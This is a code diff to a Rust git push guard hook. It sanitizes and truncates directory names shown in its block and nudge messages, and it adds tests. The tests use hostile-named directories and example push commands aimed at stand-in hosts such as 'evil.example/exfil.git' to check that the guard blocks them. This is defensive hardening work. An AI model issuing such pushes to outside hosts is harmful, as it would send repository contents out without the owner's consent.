@@ -5,6 +5,7 @@
 //! looped pushes and force-push to `main`.
 
 use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_hosts};
+use cadence_hooks_core::display::{MAX_PATH_DISPLAY, sanitize_field};
 use cadence_hooks_core::loop_analysis::{self, ChainAnalysis, LoopAnalysis};
 use cadence_hooks_core::push::push_locations;
 use cadence_hooks_core::shell::{
@@ -444,6 +445,7 @@ fn unowned_message(
         })
         .unwrap_or_default();
 
+    let work_dir = sanitize_field(work_dir, MAX_PATH_DISPLAY);
     format!(
         "🚫 git-guardrails: Push target is not yours\n   \
          Would push to: {url}\n   \
@@ -623,6 +625,7 @@ fn check_pushes_elsewhere(
         let url = match classify_push_target(remote, &RemoteNames::of(dir)) {
             PushTarget::Url(url) => url,
             PushTarget::UnownableUrl(url) | PushTarget::Unresolvable { token: url, .. } => {
+                let dir = sanitize_field(dir, MAX_PATH_DISPLAY);
                 return Some(CheckResult::block(format!(
                     "🚫 git-guardrails: Push target's owner cannot be determined\n   \
                      Would push to: {url}\n   \
@@ -680,6 +683,7 @@ fn check_pushes_elsewhere(
         let url = match target {
             PushTarget::Url(url) => url,
             PushTarget::UnownableUrl(url) | PushTarget::Unresolvable { token: url, .. } => {
+                let dir = sanitize_field(dir, MAX_PATH_DISPLAY);
                 return Some(CheckResult::block(format!(
                     "🚫 git-guardrails: Push target's owner cannot be determined\n   \
                      Would push to: {url}\n   \
@@ -1073,6 +1077,7 @@ fn input_cwd(input: &HookInput) -> String {
 
 /// The block for a push whose target git could not resolve in `work_dir`.
 fn cannot_resolve(work_dir: &str) -> CheckResult {
+    let work_dir = sanitize_field(work_dir, MAX_PATH_DISPLAY);
     CheckResult::block(format!(
         "⚠️  git-guardrails: Cannot resolve push target\n   \
          Directory: {work_dir}\n   \
@@ -1177,14 +1182,17 @@ fn unverified_directory_nudge(input: &HookInput, walk: &PushWalk) -> Option<Chec
         .of(&command, cwd)
         .iter()
         .find(|push| push.directory_unverified && !push.repository_unresolved)?;
+    // The directory checked instead is the session's cwd, or a directory the
+    // command names, so its name is not the guard's own text
+    // (cameronsjo/cadence-hooks#1509).
+    let work_dir = sanitize_field(&push.work_dir, MAX_PATH_DISPLAY);
     Some(CheckResult::nudge(format!(
         "⚠️  git-guardrails: Push directory could not be verified\n   \
          A directory change before the push (`cd \"$VAR\"`, `cd -`, `cd $(…)`, \
          `popd`, a bare `cd`, `git -C \"$D\"`, `env -C \"$D\"`) is resolved by the shell, so the push may run \
          outside the checked repository.\n   \
-         Checked instead: {}\n   \
-         Verify: cd /path/to/repo && git push origin <branch>",
-        push.work_dir
+         Checked instead: {work_dir}\n   \
+         Verify: cd /path/to/repo && git push origin <branch>"
     )))
 }
 
@@ -1553,6 +1561,7 @@ fn judge_push(input: &HookInput, walk: &PushWalk) -> CheckResult {
                 owned_url_validated = true;
             }
             PushTarget::UnownableUrl(url) => {
+                let work_dir = sanitize_field(&work_dir, MAX_PATH_DISPLAY);
                 return CheckResult::block(format!(
                     "🚫 git-guardrails: Push target's owner cannot be determined\n   \
                      Would push to: {url}\n   \
@@ -2367,6 +2376,125 @@ mod tests {
             ));
             assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
         });
+    }
+
+    // --- #1509: a line naming the directory prints its name flattened ---
+
+    /// A repo named `name` by [`crate::hostile_named_dir`] whose `origin` is
+    /// `url`. Unix only, like the one test that uses it.
+    #[cfg(unix)]
+    fn hostile_checkout(root: &std::path::Path, name: &str, url: &str) -> std::path::PathBuf {
+        let dir = crate::hostile_named_dir(root, name);
+        cadence_hooks_core::git_fixtures::init_repo(&dir);
+        cadence_hooks_core::git_fixtures::git_in(&dir, &["remote", "add", "origin", url]);
+        dir
+    }
+
+    // Unix only: Windows refuses these characters in a directory name.
+    #[cfg(unix)]
+    #[test]
+    fn every_directory_line_prints_a_hostile_directory_name_flattened() {
+        use cadence_hooks_core::Outcome::{Block, Nudge};
+        // Each row reaches a different line that names the directory: the
+        // unowned-remote block, a URL with no owner, a push git cannot
+        // resolve, a remote set by `-c remote.pushDefault=`, the same blocks
+        // for a push that runs in another directory (`git -C`), and the
+        // `Checked instead:` line of the nudge for an allowed push after a
+        // directory change the guard cannot follow. Each row is `(outcome,
+        // heading, command, directory it runs in)`. `bare` is a hostile-named
+        // repo with no remote, where a push to a name git does not know cannot
+        // resolve; `mine` is one whose `origin` is owned, so its push is
+        // allowed with the nudge.
+        let owned = crate::github_origin_repo();
+        let o = owned.path().to_str().expect("utf-8 path").to_string();
+        let not_yours = "Push target is not yours";
+        let no_owner = "Push target's owner cannot be determined";
+        let unresolved = "Cannot resolve push target";
+        let unverified = "Push directory could not be verified";
+        let url = "https://evil.example/exfil.git";
+        for (name, displayed) in crate::HOSTILE_DIR_NAMES {
+            let root = tempfile::tempdir().expect("tempdir");
+            let hostile = hostile_checkout(root.path(), name, "https://github.com/evil/y.git");
+            let bare_root = tempfile::tempdir().expect("tempdir");
+            let bare = crate::hostile_named_dir(bare_root.path(), name);
+            cadence_hooks_core::git_fixtures::init_repo(&bare);
+            let mine_root = tempfile::tempdir().expect("tempdir");
+            let mine = hostile_checkout(
+                mine_root.path(),
+                name,
+                "https://github.com/cameronsjo/y.git",
+            );
+            let h = hostile.to_str().expect("utf-8 path").to_string();
+            let b = bare.to_str().expect("utf-8 path").to_string();
+            let m = mine.to_str().expect("utf-8 path").to_string();
+            with_env(&owners_only(), || {
+                for (outcome, heading, command, cwd) in [
+                    (Block, not_yours, "git push origin main".to_string(), &h),
+                    (Block, no_owner, format!("git push {url} main"), &h),
+                    (Block, unresolved, "git push nosuch main".to_string(), &b),
+                    (
+                        Block,
+                        no_owner,
+                        "git -c remote.pushDefault=https://evil.example/x.git push main"
+                            .to_string(),
+                        &h,
+                    ),
+                    (
+                        Block,
+                        not_yours,
+                        format!("git -C \"{h}\" push origin main"),
+                        &o,
+                    ),
+                    (
+                        Block,
+                        no_owner,
+                        format!("git -C \"{h}\" push {url} main"),
+                        &o,
+                    ),
+                    (
+                        Block,
+                        unresolved,
+                        format!("git -C \"{b}\" push nosuch main"),
+                        &o,
+                    ),
+                    (
+                        Nudge,
+                        unverified,
+                        "cd \"$D\" && git push origin main".to_string(),
+                        &m,
+                    ),
+                    (
+                        Nudge,
+                        unverified,
+                        "popd; git push origin main".to_string(),
+                        &m,
+                    ),
+                ] {
+                    let result = PushRemoteGuard.run(&make_bash_with_cwd(&command, cwd));
+                    assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
+                    let message = result.message.unwrap_or_default();
+                    assert!(message.contains(heading), "{command}: {message:?}");
+                    crate::assert_hostile_dir_flattened(&message, displayed, &command);
+                }
+            });
+        }
+    }
+
+    #[test]
+    fn a_directory_line_cuts_a_long_directory_name() {
+        // Two of the sites: `cannot_resolve` and `unowned_message`, which
+        // every "Push target is not yours" block goes through.
+        let long = format!("/w/{}", "d".repeat(MAX_PATH_DISPLAY + 50));
+        for message in [
+            cannot_resolve(&long).message.unwrap_or_default(),
+            unowned_message("https://github.com/evil/y.git", &long, &[], &[], &[]),
+        ] {
+            assert!(message.contains("d…\n"), "{message}");
+            assert!(
+                !message.contains(&"d".repeat(MAX_PATH_DISPLAY + 1)),
+                "{message}"
+            );
+        }
     }
 
     // --- #1095: a push that runs somewhere `parse_work_dir` cannot see ---
